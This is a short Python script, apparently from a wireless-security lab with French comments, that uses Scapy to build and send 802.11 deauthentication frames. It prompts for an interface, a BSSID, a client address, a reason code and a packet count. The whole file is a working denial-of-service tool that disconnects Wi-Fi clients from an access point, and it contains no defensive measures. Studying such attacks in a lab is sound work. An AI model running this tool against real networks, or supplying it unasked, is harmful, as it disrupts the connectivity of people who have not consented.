from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Boucle infinie pour relancer le script (par commodité)
while(True):
    interface = input("Define interface :\n")
    bssid = input("Enter BSSID :\n")
    client = input("Enter client :\n")
    deauthNumber = input("Enter number of deauth packets to send :\n")
    print("Choose your reason code :")
    print("1 - Unspecified")
    print("4 - Disassioted due to inactivity")
    print("5 - Disassioted because AP is unable to handle all currently associated stations.")
    print("8 - Deauthenticated because sending STA is leaving BSS")
    codeReason = input("Reason code :\n")
    codeReason = int(codeReason)
    
    # Ici on définit le sens des reason codes selon ce qui est choisi par l'utilisateur
    # Le 1 pourrait aller dans les 2 sens selon nos recherches mais ce sens fonctionne très bien
    if(codeReason == 1):
        src = bssid
        dst = client

    elif(codeReason == 4):
        src = bssid
        dst = client

    elif(codeReason == 5):
        src = bssid
        dst = client

    elif(codeReason == 8):
        src = client
        dst = bssid

    else:
        print("Error, bad reason code")
        break

    # On construit notre paquet de Deauth
    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=codeReason)
    # On envoit le paquet n fois (demandé à l'utilisateur)
    sendp(packet, iface=interface, inter=0.5,count=int(deauthNumber))